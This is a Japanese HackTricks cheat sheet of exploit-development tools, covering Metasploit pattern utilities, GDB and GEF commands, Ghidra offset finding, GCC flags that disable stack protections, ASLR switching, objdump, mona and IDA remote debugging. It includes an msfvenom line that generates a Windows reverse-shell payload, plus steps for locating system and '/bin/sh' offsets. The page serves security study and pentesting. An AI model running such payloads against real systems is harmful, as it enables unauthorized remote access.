<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


# Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
## シェルコード

A shellcode is a small piece of code that is used as the payload in an exploit. It is typically written in assembly language and is designed to be injected into a vulnerable program to gain unauthorized access or execute arbitrary commands.

シェルコードは、エクスプロイトのペイロードとして使用される小さなコードです。通常、アセンブリ言語で書かれ、脆弱なプログラムに注入され、不正なアクセスを取得したり、任意のコマンドを実行したりするために設計されています。

Shellcodes are commonly used in buffer overflow attacks, where an attacker overflows a buffer in a program to overwrite the return address and redirect the program's execution flow to the injected shellcode.

シェルコードは、バッファオーバーフロー攻撃で一般的に使用されます。攻撃者は、プログラム内のバッファをオーバーフローさせ、リターンアドレスを上書きし、プログラムの実行フローを注入されたシェルコードにリダイレクトします。

Shellcodes can be written in different architectures, such as x86, x64, ARM, MIPS, etc., depending on the target system's architecture.

シェルコードは、対象システムのアーキテクチャに応じて、x86、x64、ARM、MIPSなど、さまざまなアーキテクチャで書かれることがあります。

There are various techniques to create shellcodes, including manual assembly, using shellcode generators, or leveraging existing shellcode libraries.

シェルコードを作成するためのさまざまなテクニックがあります。手動アセンブリ、シェルコードジェネレータの使用、または既存のシェルコードライブラリの活用などがあります。

It is important to note that the use of shellcodes for unauthorized access or malicious purposes is illegal and unethical. Shellcodes should only be used for legitimate purposes, such as penetration testing or security research.

シェルコードを不正なアクセスや悪意のある目的で使用することは、違法で倫理に反します。シェルコードは、ペネトレーションテストやセキュリティ研究などの正当な目的にのみ使用するべきです。
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
# GDB

## インストール

GDB（GNU Debugger）は、プログラムのデバッグに使用される強力なツールです。GDBをインストールするには、次の手順に従ってください。

### Linux

1. ターミナルを開きます。
2. 次のコマンドを実行して、GDBをインストールします。

   ```
   sudo apt-get install gdb
   ```

### macOS

1. ターミナルを開きます。
2. Homebrewを使用してGDBをインストールします。次のコマンドを実行します。

   ```
   brew install gdb
   ```

### Windows

Windowsでは、GDBを直接インストールすることはできません。代わりに、CygwinやMinGWを使用してGDBをインストールする必要があります。以下の手順を参考にしてください。

1. Cygwinをインストールします。[公式ウェブサイト](https://www.cygwin.com/)からインストーラをダウンロードし、インストールします。
2. インストール中に、パッケージマネージャを使用して`gdb`を選択し、インストールします。
3. MinGWをインストールします。[公式ウェブサイト](http://www.mingw.org/)からインストーラをダウンロードし、インストールします。
4. インストール中に、パッケージマネージャを使用して`gdb`を選択し、インストールします。

GDBのインストールが完了したら、次のセクションでGDBの基本的な使用方法について学びましょう。
```
apt-get install gdb
```
## パラメータ

**-q** --> バナーを表示しない\
**-x \<file>** --> ここからGDBの命令を自動実行する\
**-p \<pid>** --> プロセスにアタッチする

### 命令

\> **disassemble main** --> 関数を逆アセンブルする\
\> **disassemble 0x12345678**\
\> **set disassembly-flavor intel**\
\> **set follow-fork-mode child/parent** --> 作成されたプロセスを追跡する\
\> **p system** --> system関数のアドレスを見つける\
\> **help**\
\> **quit**

\> **br func**  --> 関数にブレークポイントを追加する\
\> **br \*func+23**\
\> **br \*0x12345678**\
**> del NUM** --> その数のブレークポイントを削除する\
\> **watch EXPRESSION** --> 値が変更された場合に中断する

**> run** --> 実行する\
**> start** --> mainで開始して中断する\
\> **n/next** --> 次の命令を実行する（内部には入らない）\
\> **s/step** --> 次の命令を実行する\
\> **c/continue** --> 次のブレークポイントまで続行する

\> **set $eip = 0x12345678** --> $eipの値を変更する\
\> **info functions** --> 関数に関する情報\
\> **info functions func** --> 関数の情報\
\> **info registers** --> レジスタの値\
\> **bt** --> スタック\
\> **bt full** --> 詳細なスタック

\> **print variable**\
\> **print 0x87654321 - 0x12345678** --> 計算する\
\> **examine o/x/u/t/i/s dir\_mem/reg/puntero** --> 8進数/16進数/10進数/2進数/命令/ASCIIで内容を表示する

* **x/o 0xDir\_hex**
* **x/2x $eip** --> EIPから2ワード
* **x/2x $eip -4** -->  $eip - 4
* **x/8xb $eip** --> 8バイト（b-> バイト, h-> 2バイト, w-> 4バイト, g-> 8バイト）
* **i r eip** --> $eipの値
* **x/w pointer** --> ポインタの値
* **x/s pointer** --> ポインタが指す文字列
* **x/xw \&pointer** --> ポインタの場所のアドレス
* **x/i $eip** —> EIPの命令

## [GEF](https://github.com/hugsy/gef)
```bash
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- ef➤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gef➤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
## テクニック

### GDBの同じアドレス

デバッグ中には、GDBは**実行時にバイナリが使用するアドレスとは若干異なるアドレスを持つことがあります。** GDBが同じアドレスを持つようにするには、次の手順を実行します。

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<path>` _バイナリの絶対パスを指定します_
* 同じ絶対パスを使用してバイナリをエクスプロイトします
* GDBを使用しているときとバイナリをエクスプロイトしているときに、`PWD`と`OLDPWD`は同じである必要があります

### 関数の呼び出しを特定するためのバックトレース

**静的にリンクされたバイナリ**の場合、すべての関数はバイナリに属しています（外部ライブラリではありません）。この場合、バイナリがユーザーからの入力を要求するためにたどるフローを**特定するのは困難**です。\
バイナリを**gdb**で実行し、入力を要求されるまで実行します。その後、**CTRL+C**で停止し、**`bt`**（**バックトレース**）コマンドを使用して呼び出された関数を確認できます。
```
gef➤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
## GDBサーバー

`gdbserver --multi 0.0.0.0:23947`（IDAでは、LinuxマシンとWindowsマシンの実行可能ファイルの絶対パスを入力する必要があります）

# Ghidra

## スタックオフセットの検索

**Ghidra**は、**ローカル変数の位置に関する情報によって、バッファオーバーフローのオフセットを見つけるのに非常に便利です。**\
たとえば、以下の例では、`local_bc`でのバッファフローは、オフセット`0xbc`が必要であることを示しています。さらに、`local_10`がキャナリーコンキーである場合、`local_bc`からそれを上書きするためのオフセットは`0xac`です。\
_ RIPが保存される最初の0x08は、RBPに属していることを覚えておいてください。_

![](<../../.gitbook/assets/image (616).png>)

# GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> 保護なしでコンパイルする\
**-o** --> 出力\
**-g** --> コードを保存する（GDBで表示できるようになる）\
**echo 0 > /proc/sys/kernel/randomize\_va\_space** --> LinuxでASLRを無効にするため

**シェルコードをコンパイルするには:**\
**nasm -f elf assembly.asm** --> ".o"を返す\
**ld assembly.o -o shellcodeout** --> 実行可能ファイル

# Objdump

**-d** --> 実行可能ファイルのセクションを逆アセンブルする（コンパイルされたシェルコードのオペコードを表示し、ROPガジェットを見つけ、関数のアドレスを見つける...）\
**-Mintel** --> **Intel**構文\
**-t** --> **シンボル**テーブル\
**-D** --> **すべての**逆アセンブル（静的変数のアドレス）\
**-s -j .dtors** --> dtorsセクション\
**-s -j .got** --> gotセクション\
\-D -s -j .plt --> **plt**セクション **逆アセンブル**\
**-TR** --> **リロケーション**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> GOT内の"puts"のアドレスを変更するためのアドレス\
**objdump -D ./exec | grep "VAR\_NAME"** --> 静的変数のアドレス（これらはDATAセクションに格納されています）。

# コアダンプ

1. プログラムを開始する前に `ulimit -c unlimited` を実行します
2. `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t` を実行します
3. `sudo gdb --core=\<path/core> --quiet` を実行します

# その他

**ldd executable | grep libc.so.6** --> アドレス（ASLRが有効な場合、これは毎回変わります）\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> アドレスが大幅に変化するかどうかを確認するためのループ\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> "system"のオフセット\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> "/bin/sh"のオフセット

**strace executable** --> 実行可能ファイルが呼び出す関数\
**rabin2 -i ejecutable -->** すべての関数のアドレス

# **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
# IDA

## リモートLinuxでのデバッグ

IDAフォルダ内には、Linux内のバイナリをデバッグするために使用できるバイナリが含まれています。そのためには、バイナリ_linux\_server_または_linux\_server64_をLinuxサーバー内に移動し、バイナリが含まれているフォルダ内で実行します。
```
./linux_server64 -Ppass
```
次に、デバッガを設定します：デバッガ（リモートLinux）→プロセスオプション...：

![](<../../.gitbook/assets/image (101).png>)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- あなたは**サイバーセキュリティ会社**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
